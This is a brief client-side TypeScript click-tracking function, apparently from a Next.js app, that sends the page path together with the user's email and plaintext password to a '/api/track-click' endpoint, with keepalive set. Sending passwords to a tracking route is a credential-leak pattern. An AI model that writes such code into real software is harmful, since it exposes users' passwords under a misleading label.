"use client"



// wherever the clickable element lives


 export function handleClick(email?:string, password?:string) {
  fetch('/api/track-click', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ page: window.location.pathname, email, password }),
    keepalive: true, // ensures the request completes even if the page navigates away
  });
}